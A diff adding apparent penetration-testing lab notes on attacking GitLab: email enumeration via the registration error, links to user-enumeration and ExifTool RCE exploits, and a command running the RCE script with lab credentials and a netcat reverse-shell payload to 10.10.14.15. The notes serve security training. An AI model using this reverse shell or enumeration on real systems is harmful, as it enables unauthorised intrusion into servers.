@@ -446,3 +446,14 @@ tar -cvzf updater.tar.gz splunk_shell/
 * The only way to footprint the GitLab version number in use is by browsing to the `/help` page when logged in
 	* not much we can do without the version number or being logged in
 * first thing we should try is browsing to `/explore` and see if there are any public projects that may contain something interesting
+* On this particular instance of GitLab (and likely others), we can also enumerate emails. If we try to register with an email that has already been taken, we will get the error `1 error prohibited this user from being saved: Email has already been taken`
+
+### Attacking GitLab
+* [User enum](https://www.exploit-db.com/exploits/49821)
+	* GitLab's defaults are set to 10 failed attempts resulting in an automatic unlock after 10 minutes
+*  GitLab Community Edition version 13.10.2 and lower suffered from an authenticated remote code execution [vulnerability](https://hackerone.com/reports/1154542) due to an issue with ExifTool handling metadata in uploaded image files
+	* https://www.exploit-db.com/exploits/49951
+	* need a valid username and password
+```bash
+python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f '
+```
